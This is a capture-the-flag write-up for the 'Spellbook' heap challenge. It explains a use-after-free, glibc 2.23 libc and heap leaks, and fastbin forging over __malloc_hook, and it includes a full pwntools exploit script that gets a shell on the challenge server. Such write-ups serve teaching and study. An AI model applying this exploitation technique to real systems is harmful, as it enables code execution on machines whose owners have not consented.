# Spellbook

### Forging Fastbins For Fun (and CTF points!)

The description for this challenge is as follows:

*In this magic school, there are some spellbound books given to young wizards where they can create and store the spells they learn throughout the years. Some forbidden spells can cause serious damage to other wizards and are not allowed. Beware what you write inside this book. Have fun if you are a true wizard, after all..*

This challenge was rated as medium difficulty, and it was worth 350 points out of a possible 1000 at the end of the competition. It was relatively straightforward to exploit with a basic knowledge of the concepts of exploiting a UAF vulnerability and forging fastbins. The challenge included a zip file as a downloadable; the most interesting contents of this file were the binary itself and a glibc directory with library and linker files that the binary automatically uses when run.

**TL;DR Solution:** Note the presence of a UAF vulnerability that allows freed bins to be viewed and edited. Also note the use of libc 2.23, indicating that fastbins will be the primary mode of exploitation rather than tcache bins. Allocate and free a larger chunk into the unsorted bin, then view it to get a libc leak. Also get a heap leak from a fastbin so that you can avoid corrupting the 0x30 fastbin. Then forge a fastbin over the malloc hook to overwrite it to a onegadget, trigger it, and win.

## Gathering Information

When the binary is run, is seems to provide a fairly standard set of pwn heap challenge options with add, show, edit, and delete. 
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/HTB_Uni22/pwn_spellbook/challenge$ ./spellbook


                 ⅀ ℙ ∉ ⎳ ⎳ Ⓑ ℺ ℺ ₭


                           ▗ ▖▗ ▖▗ ▖▖▖▖
               ▗▄▄     ▗ ▘▝            ▘▘▖
           ▖▝▀     ▀▗ ▞                   ▘▖
       ▗ ▘           ▝▗                     ▘▘▖
     ▖▝                ▝▚                      ▘▖
   ▞▚                    ▝▄                      ▝▗▖
  ▐▘ ▄                     ▘▖                       ▘▖
  ▜▖  ▚                     ▝▚▖             ▗▄▄▄▄▄▄▄▄▄▙▖
   ▜▌  ▚                      ▝▗      ▄▖▀▀▀▀           ▙▖
    ▜▙  ▚                       ▀▄  ▄▘                 ▜█▄▖
     ▀▌  ▚                ▗▖▖    ▝▜▞     ▗▄▄▄▄▄▟▛█▜▛███▛█▜▘
      ▜▙  ▜           ▗ ▀▝       ▗█▄▙▖▗▟██▛█▜▀▀▀▀▀▀
       ▐▙  ▐       ▗▝▘        ▖▖▖█████▀▘
        ▐▙  ▝▖  ▄▝▘     ▗▄▄███▀▀▀▀▀▝
         ▀▙  ▜▝▘    ▗▄▄██▀▀
          ▀▙▖▐▘  ▗▄▛█▝▀
           ▐▙▟ ▄▛▛▘▘
            ▝▛▀▘


 ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ
ᐊ 1. Add    ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 2. Show   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 3. Edit   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 4. Delete ⅀ ℙ ∉ ⎳ ⎳ ᐅ
 ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ

>> 1

⅀ ℙ ∉ ⎳ ⎳'s entry: 2

Insert ⅀ ℙ ∉ ⎳ ⎳'s type: aaaaaa

Insert ⅀ ℙ ∉ ⎳ ⎳ power: 34

Enter ⅀ ℙ ∉ ⎳ ⎳: bbbbbbbbbbbb

[+] ⅀ ℙ ∉ ⎳ ⎳ has been added!

 ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ
ᐊ 1. Add    ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 2. Show   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 3. Edit   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 4. Delete ⅀ ℙ ∉ ⎳ ⎳ ᐅ
 ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ

>> 2

⅀ ℙ ∉ ⎳ ⎳'s entry: 2

⅀ ℙ ∉ ⎳ ⎳'s type: aaaaaa
⅀ ℙ ∉ ⎳ ⎳       : bbbbbbbbbbbb
 ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ
ᐊ 1. Add    ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 2. Show   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 3. Edit   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 4. Delete ⅀ ℙ ∉ ⎳ ⎳ ᐅ
 ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ

>>
>>
```
Since this is most likely a heap challenge, it would be great to know which libc version we're dealing with! I usually just do this by strings-ing the libc and grepping for 2.2 and 2.3; here, we can see that the version is 2.23, which I know means that this is a pre-tcache version of libc, which means that we are likely to be dealing with fastbins
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/HTB_Uni22/pwn_spellbook/challenge$ strings glibc/libc.so.6 | grep 2.2
GLIBC_2.2.5
GLIBC_2.2.6
GLIBC_2.22
GLIBC_2.23
1997-12-20
glibc 2.23
NPTL 2.23
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.
libc-2.23.so
```

Now, the functionality of the add function wasn't super clear just by interacting with the binary, so the next step is to look at Ghidra. The function is clearly labelled; when it asks for entry, this seems to be letting you set the index of your entry in a table (in global variables). Then a 0x28 byte chunk is allocated, which holds what we input for "Type". We can only input 0x17 bytes here, so it doesn't look like a heap overflow. The "Insert Power" option lets us input another number, and as long as it is a positive number less than 1000, a chunk of that size will be mallocced. The final entry is read into that chunk; you are allowed to enter your specified length minus one bytes, and a null byte is appended to the end. Again, there is no obvious heap overflow.
```
    canary = *(long *)(in_FS_OFFSET + 0x28);
  printf(s__'s_entry:_001017d8);
  index = read_num();
  if (index < 10) {
    __buf = (spl *)malloc(0x28);
    printf(s__Insert_'s_type:_00101840);
    sVar1 = read(0,__buf,0x17);
    __buf->type[(int)sVar1 + -1] = '\0';
    printf(s__Insert_power:_00101868);
    uVar2 = read_num();
    power_size = (int)uVar2;
    if ((power_size < 1) || (1000 < power_size)) {
      printf("\n%s[-] Such power is not allowed!\n",&DAT_001017f7);
                    /* WARNING: Subroutine does not return */
      exit(0x122);
    }
    __buf->power = power_size;
    pcVar3 = (char *)malloc((long)__buf->power);
    __buf->sp = pcVar3;
    printf(s__Enter_:_001018b3);
    sVar1 = read(0,__buf->sp,(long)(power_size + -1));
    __buf->sp[(long)(int)sVar1 + -1] = '\0';
    table[index] = __buf;
    printf(&DAT_001018d8,&DAT_001018d0,&DAT_00101198);
  }
```
The edit and view functions are much as you would expect; the delete function is the interesting part. The chunks allocated in the add function are freed, but it does not look like anything is being done about the addresses of those chunks stored in memory. 
```
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf(s__'s_entry:_001017d8);
  index = read_num();
  if ((index < 10) && (table[index] != (spl *)0x0)) {
    __ptr = table[index];
                    /* looks like it's not zeroing out these addresses in the structure */
    free(__ptr->sp);
    free(__ptr);
    printf(&DAT_00101978,&DAT_001018d0,&DAT_00101198);
  }
```
This means I can run a quick experiment. I added an entry at index 2 and showed the contents, then deleted the entry. After deletion, I attempted to show the entry once again, and it worked! I even get an address leak for the heap in this example. This means that we have a Use-After-Free (UAF) vulnerability, which is a very common type of heap vulnerability where you can still interact with chunks after they're freed because references to the location of those chunks are allowed to persist in memory. 
```
...
>> 2

⅀ ℙ ∉ ⎳ ⎳'s entry: 2

⅀ ℙ ∉ ⎳ ⎳'s type: aaaaaaaaaaaaa
⅀ ℙ ∉ ⎳ ⎳       : bbbbbbbbbbbbbbbbbbb
 ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ
ᐊ 1. Add    ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 2. Show   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 3. Edit   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 4. Delete ⅀ ℙ ∉ ⎳ ⎳ ᐅ
 ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ

>> 4

⅀ ℙ ∉ ⎳ ⎳'s entry: 2

[+] ⅀ ℙ ∉ ⎳ ⎳ has been deleted!

 ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ
ᐊ 1. Add    ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 2. Show   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 3. Edit   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 4. Delete ⅀ ℙ ∉ ⎳ ⎳ ᐅ
 ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ

>> 2

⅀ ℙ ∉ ⎳ ⎳'s entry: 2

⅀ ℙ ∉ ⎳ ⎳'s type: 0X[U
⅀ ℙ ∉ ⎳ ⎳       :
 ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ ᐃ
ᐊ 1. Add    ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 2. Show   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 3. Edit   ⅀ ℙ ∉ ⎳ ⎳ ᐅ
ᐊ 4. Delete ⅀ ℙ ∉ ⎳ ⎳ ᐅ
 ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ ᐁ

>>
```
## Getting a Libc Leak

In a heap challenge, we typically want to get a libc leak, particularly since in this case, PIE is enabled so there would be no option to simply overwrite a GOT table entry or similar. In libc 2.23, freed chunks that are too big for fastbins ( > 0x80 bytes), will initially be placed in the unsorted bin. This is actually very valuable to us because freed chunks in the unsorted bin include a libc address, specifically for the offset main_arena+88, in both the forward pointer and backward pointer sections (the forward pointer is in the same place as the content area in an allocated chunk). All we have to do then is allocate and free a larger chunk and view it; I will note that I had to allocate an additional chunk after the one I planned to free, otherwise it seemed to just get rolled back into the top chunk directly.

So, after writing appropriate helper functions, the relevant snippet of my script looks like this:
```
add(1, b'a' * 0x17, 0x100, b'b' * (0x100-1)) #target for unsorted bin
add(2, b'c' * 0x17, 0x60, b'd' * (0x60-1)) #padding between chunk above and top chunk
delete(1)
show(1)
target.interactive()
```
Here is a view of GDB after freeing that chunk into the unsorted bin. Note the presence of the libc addresses in the heap bin.
```
gef➤  x/20gx 0x0000562594f42030
0x562594f42030: 0x0000000000000100      0x0000000000000111
0x562594f42040: 0x00007fb9b8e80b78      0x00007fb9b8e80b78
0x562594f42050: 0x6262626262626262      0x6262626262626262
0x562594f42060: 0x6262626262626262      0x6262626262626262
0x562594f42070: 0x6262626262626262      0x6262626262626262
0x562594f42080: 0x6262626262626262      0x6262626262626262
0x562594f42090: 0x6262626262626262      0x6262626262626262
0x562594f420a0: 0x6262626262626262      0x6262626262626262
0x562594f420b0: 0x6262626262626262      0x6262626262626262
0x562594f420c0: 0x6262626262626262      0x6262626262626262
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────────────────────────── Fastbins for arena 0x7fb9b8e80b20 ──────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────── Unsorted Bin for arena '*0x7fb9b8e80b20' ───────────────────────────────────────
[+] unsorted_bins[0]: fw=0x562594f42030, bk=0x562594f42030
 →   Chunk(addr=0x562594f42040, size=0x110, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
──────────────────────────────────────── Small Bins for arena '*0x7fb9b8e80b20' ────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────── Large Bins for arena '*0x7fb9b8e80b20' ────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```
And here, we can see the libc address get leaked to the terminal.
```
⅀ ℙ ∉ ⎳ ⎳'s type:
⅀ ℙ ∉ ⎳ ⎳       : x\x0b\xb8\xb9\x7f
```

## Forging Fastbins

Some background on fastbins: fastbins are singly-linked lists. At least in this version of libc, there is a fastbin for chunks of sizes 0x20-0x80. Each fastbin includes a forward pointer, which points to the previous entry in the fastbin. 

Now, if you have pre-existing familiarity with dupping tcache bins, the next step here probably seems quite straightforward; with tcache, we could simply allocate and free a few chunks of the same size (any size that goes into tcache would work), overwrite the last one's forward pointer (using the UAF vuln and edit function) to the address of malloc hook based on the libc leak, and allocate two new chunks of the same size to get a heap chunk allocated on top of the malloc hook and overwrite it.

However, fastbins are actually slightly more secure than tcache bins in this respect. When new chunks are allocated from the fastbin, it actually checks if the size of the chunk (specified by the eight bytes directly before the content area/forward pointer) actually matches the size of the fastbin in which it has been placed. If it doesn't, the allocator will raise an error. Here is some code to prove that; I attempt to directly overwrite the malloc hook from the 0x30 "Types" chunks
```
add(1, b'a' * 0x17, 0x100, b'b' * (0x100-1))
add(2, b'c' * 0x17, 0x50, b'd' * (0x50-1))
add(3, b'c' * 0x17, 0x50, b'd' * (0x50-1))

delete(1)
show(1)
print(target.recvuntil(b'type:'))
print(target.recvuntil(b': '))
leak = target.recv(6)
free_libc = u64(leak + b'\x00' * 2) - 0x340638
print(hex(free_libc))
libc_base = free_libc - libc.symbols['free']
execve = libc_base + libc.symbols['execve']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
onegadget = libc_base + 0x4527a
print(hex(onegadget))
print(hex(malloc_hook))

delete(3)
delete(2)

edit(2, p64(malloc_hook), b'a')
add(4, b'a' * 0x17, 0x40, b'a' * (0x40-1))
add(5, p64(onegadget), 0x40, b'a' * (0x40-1))
```
If I look at heap bins shortly after overwriting the forward pointer for a chunk in the 0x30 fastbin to the malloc hook address, I can see that my new chunk is showing up, but its size is supposedly 0, and it's showing up with "incorrect fastbin index"
```
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────────────────────────── Fastbins for arena 0x7fa7ca46bb20 ──────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x55f65499c150, size=0x30, flags=)  ←  Chunk(addr=0x7fa7ca46bb20, size=0x0, flags=) [incorrect fastbin_index]
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60]  ←  Chunk(addr=0x55f65499c180, size=0x60, flags=PREV_INUSE)  ←  Chunk(addr=0x55f65499c210, size=0x60, flags=PREV_INUSE)
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```
If I were to carry on at this point, I would get an error. I can avoid that by instead overwriting the forward pointer to an address slightly before the malloc hook but where the size will show up as one within the fastbins; 0x7f is one of the more plausible sizes in this case since there are already libc addresses in this section; I just need to find one preceded by enough nulls so that I can pick an offset with a full int value of 0x7f; at least in libc version 2.23, this can be found at the offset __malloc_hook-0x23, at 0x00007f3b0b832aed in the following snippet of memory. This size of chunk is long enough that I will be able to overwrite the actual malloc hook when editing the content of the chunk.
```
gef➤  x/20gx 0x7f3b0b832ab0
0x7f3b0b832ab0: 0x0000000000000000      0x0000000000000000
0x7f3b0b832ac0: 0x0000000000000000      0x0000000000000000
0x7f3b0b832ad0: 0x0000000000000000      0x0000000000000000
0x7f3b0b832ae0: 0x0000000000000000      0x0000000000000000
0x7f3b0b832af0: 0x00007f3b0b831260      0x0000000000000000
0x7f3b0b832b00 <__memalign_hook>:       0x00007f3b0b4f3ea0      0x00007f3b0b4f3a70
0x7f3b0b832b10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
0x7f3b0b832b20: 0x0000000100000000      0x0000000000000000
0x7f3b0b832b30: 0x0000000000000000      0x0000000000000000
0x7f3b0b832b40: 0x0000000000000000      0x0000000000000000
gef➤  x/10gx 0x00007f3b0b832aed
0x7f3b0b832aed: 0x3b0b831260000000      0x000000000000007f
0x7f3b0b832afd: 0x3b0b4f3ea0000000      0x3b0b4f3a7000007f
0x7f3b0b832b0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
0x7f3b0b832b1d: 0x0000000000000000      0x0000000000000000
0x7f3b0b832b2d: 0x0000000000000000      0x0000000000000000
```
A final complication here is the fact that the add function requires the allocation and fill of first a chunk that goes in the 0x30 bin, then the allocation of a custom-sized bin. We need to use the custom size for the malloc hook overwrite, but the 0x30 bin will also end up with its forward pointer being overwritten, which means that we need an address in memory with a size that won't throw an error in the 0x30 fastbin. I opted to go back and leak a heap address (quite simple using the technique to get the libc address, but by leaking a fastbin's metadata rather than an unsorted bin's metadata), then overwrote the 0x30 bin forward pointer with a heap address for one of the other 0x30 fastbin chunks. 

So, the methodology of my script is to allocate a >0x80 chunk and two 0x60 chunks (goes in 0x70 fastbin when metadata is added). Then free and show the large chunk for a libc leak, then free both fastbin chunks and show the last to be free in order to get a heap address from the forward pointer. Finally, I edit one of the freed fastbin chunks to mantain an appropriately-sized heap address in the 0x30 fastbin, and the malloc hook - 0x23 address in the 0x70 fastbin's forward pointer. If I then use the add function twice, the second round of mallocs will allocate chunks at my new forward pointers. The malloc hook can get overwritten with a working onegadget, and triggering a single, final malloc will get me a shell.
```
from pwn import *

target = process('./spellbook')

#pid = gdb.attach(target, "\nb *show+170\nb *delete+160\nb *add+318\nb *add+102\nb *edit+186\nb *edit+248\n set disassembly-flavor intel\ncontinue")

#target = remote('167.99.206.87', 30567)

libc = ELF('glibc/libc.so.6')

def add(index, type, power, power_content):
    
    print(target.recvuntil(b'4. Delete'))
    target.sendline(b'1')
    
    print(target.recvuntil(b's entry:'))
    target.sendline(str(index))
    print(target.recvuntil(b's type:'))
    target.send(type)
    print(target.recvuntil(b'power:'))
    target.sendline(str(power))
    print(target.recvuntil(b'Enter'))
    target.send(power_content)

def show(index):
    print(target.recvuntil(b'4. Delete'))
    target.sendline(b'2')
    
    print(target.recvuntil(b's entry:'))
    target.sendline(str(index))
    
    
def edit(index, type, power_content):
    
    print(target.recvuntil(b'4. Delete'))
    target.sendline(b'3')
    
    print(target.recvuntil(b's entry:'))
    target.sendline(str(index))
    print(target.recvuntil(b's type:'))
    target.sendline(type)
    print(target.recvuntil(b'New'))
    target.sendline(power_content)
    
def delete(index):
    print(target.recvuntil(b'4. Delete'))
    target.sendline(b'4')
    
    print(target.recvuntil(b's entry:'))
    target.sendline(str(index))

add(1, b'a' * 0x17, 0x100, b'b' * (0x100-1))
add(2, b'c' * 0x17, 0x60, b'd' * (0x60-1))
add(3, b'c' * 0x17, 0x60, b'd' * (0x60-1))

delete(1)
show(1)
print(target.recvuntil(b'type:'))
print(target.recvuntil(b': '))
leak = target.recv(6)
free_libc = u64(leak + b'\x00' * 2) - 0x340638
print(hex(free_libc))



libc_base = free_libc - libc.symbols['free']
execve = libc_base + libc.symbols['execve']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
onegadget = libc_base + 0x4527a
print(hex(onegadget))
print(hex(malloc_hook))

delete(3)
delete(2)
show(2)


print(target.recvuntil(b'type:'))
print(target.recvuntil(b': '))

leak = target.recv(6)
heap_leak = u64(leak+b'\x00' * 2)
print(hex(heap_leak))

edit(2, p64(heap_leak-0x210), p64(malloc_hook-0x23))



add(4, b'e' * 0x17, 0x60, cyclic(0x60-1))
add(5, b'f' * 0x17, 0x60, b'a' * 19 + p64(onegadget))

print(target.recvuntil(b'4. Delete'))
target.sendline(b'1')

print(target.recvuntil(b's entry:'))
target.sendline(b'6')

target.interactive()
```
When I execute the script against the remote server, a shell is spawned and I can read the flag!
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/HTB_Uni22/pwn_spellbook/challenge$ python3 spellbook_exploit.py
[+] Opening connection to 167.99.206.87 on port 30567: Done
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/HTB_Uni22/pwn_spellbook/challenge/glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\x1b[1;34m\n\n                 \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe2\x92\xb7 \xe2\x84\xba \xe2\x84\xba \xe2\x82\xad\n\n\n                           \xe2\x96\x97 \xe2\x96\x96\xe2\x96\x97 \xe2\x96\x96\xe2\x96\x97 \xe2\x96\x96\xe2\x96\x96\xe2\x96\x96\xe2\x96\x96                     \n               \xe2\x96\x97\xe2\x96\x84\xe2\x96\x84     \xe2\x96\x97 \xe2\x96\x98\xe2\x96\x9d            \xe2\x96\x98\xe2\x96\x98\xe2\x96\x96                  \n           \xe2\x96\x96\xe2\x96\x9d\xe2\x96\x80     \xe2\x96\x80\xe2\x96\x97 \xe2\x96\x9e                   \xe2\x96\x98\xe2\x96\x96                \n       \xe2\x96\x97 \xe2\x96\x98           \xe2\x96\x9d\xe2\x96\x97                     \xe2\x96\x98\xe2\x96\x98\xe2\x96\x96             \n     \xe2\x96\x96\xe2\x96\x9d                \xe2\x96\x9d\xe2\x96\x9a                      \xe2\x96\x98\xe2\x96\x96           \n   \xe2\x96\x9e\xe2\x96\x9a                    \xe2\x96\x9d\xe2\x96\x84                      \xe2\x96\x9d\xe2\x96\x97\xe2\x96\x96        \n  \xe2\x96\x90\xe2\x96\x98 \xe2\x96\x84                     \xe2\x96\x98\xe2\x96\x96                       \xe2\x96\x98\xe2\x96\x96      \n  \xe2\x96\x9c\xe2\x96\x96  \xe2\x96\x9a                     \xe2\x96\x9d\xe2\x96\x9a\xe2\x96\x96             \xe2\x96\x97\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x99\xe2\x96\x96    \n   \xe2\x96\x9c\xe2\x96\x8c  \xe2\x96\x9a                      \xe2\x96\x9d\xe2\x96\x97      \xe2\x96\x84\xe2\x96\x96\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80           \xe2\x96\x99\xe2\x96\x96   \n    \xe2\x96\x9c\xe2\x96\x99  \xe2\x96\x9a                       \xe2\x96\x80\xe2\x96\x84  \xe2\x96\x84\xe2\x96\x98                 \xe2\x96\x9c\xe2\x96\x88\xe2\x96\x84\xe2\x96\x96 \n     \xe2\x96\x80\xe2\x96\x8c  \xe2\x96\x9a                \xe2\x96\x97\xe2\x96\x96\xe2\x96\x96    \xe2\x96\x9d\xe2\x96\x9c\xe2\x96\x9e     \xe2\x96\x97\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x9f\xe2\x96\x9b\xe2\x96\x88\xe2\x96\x9c\xe2\x96\x9b\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x9b\xe2\x96\x88\xe2\x96\x9c\xe2\x96\x98 \n      \xe2\x96\x9c\xe2\x96\x99  \xe2\x96\x9c           \xe2\x96\x97 \xe2\x96\x80\xe2\x96\x9d       \xe2\x96\x97\xe2\x96\x88\xe2\x96\x84\xe2\x96\x99\xe2\x96\x96\xe2\x96\x97\xe2\x96\x9f\xe2\x96\x88\xe2\x96\x88\xe2\x96\x9b\xe2\x96\x88\xe2\x96\x9c\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80         \n       \xe2\x96\x90\xe2\x96\x99  \xe2\x96\x90       \xe2\x96\x97\xe2\x96\x9d\xe2\x96\x98        \xe2\x96\x96\xe2\x96\x96\xe2\x96\x96\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x98                    \n        \xe2\x96\x90\xe2\x96\x99  \xe2\x96\x9d\xe2\x96\x96  \xe2\x96\x84\xe2\x96\x9d\xe2\x96\x98     \xe2\x96\x97\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x9d                        \n         \xe2\x96\x80\xe2\x96\x99  \xe2\x96\x9c\xe2\x96\x9d\xe2\x96\x98    \xe2\x96\x97\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80                                 \n          \xe2\x96\x80\xe2\x96\x99\xe2\x96\x96\xe2\x96\x90\xe2\x96\x98  \xe2\x96\x97\xe2\x96\x84\xe2\x96\x9b\xe2\x96\x88\xe2\x96\x9d\xe2\x96\x80                                     \n           \xe2\x96\x90\xe2\x96\x99\xe2\x96\x9f \xe2\x96\x84\xe2\x96\x9b\xe2\x96\x9b\xe2\x96\x98\xe2\x96\x98                                        \n            \xe2\x96\x9d\xe2\x96\x9b\xe2\x96\x80\xe2\x96\x98                                            \n\n\n \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83\n\xe1\x90\x8a 1. Add    \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 2. Show   \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 3. Edit   \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 4. Delete'
...
0x7f28adc5a540
0x7f28adc1b27a
0x7f28adf9ab10
b'\n \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83\n\xe1\x90\x8a 1. Add    \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 2. Show   \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 3. Edit   \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 4. Delete'
...
0x55ade939a210
b'\n \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83 \xe1\x90\x83\n\xe1\x90\x8a 1. Add    \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 2. Show   \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 3. Edit   \xe2\x85\x80 \xe2\x84\x99 \xe2\x88\x89 \xe2\x8e\xb3 \xe2\x8e\xb3 \xe1\x90\x85\n\xe1\x90\x8a 4. Delete'
...
[*] Switching to interactive mode
 $ ls
flag.txt
glibc
spellbook
$ cat flag.txt
HTB{f45tb1n_c0rrupt10n_0n_p4g3_gl1bc_2.23}
$
```
Thanks for reading!
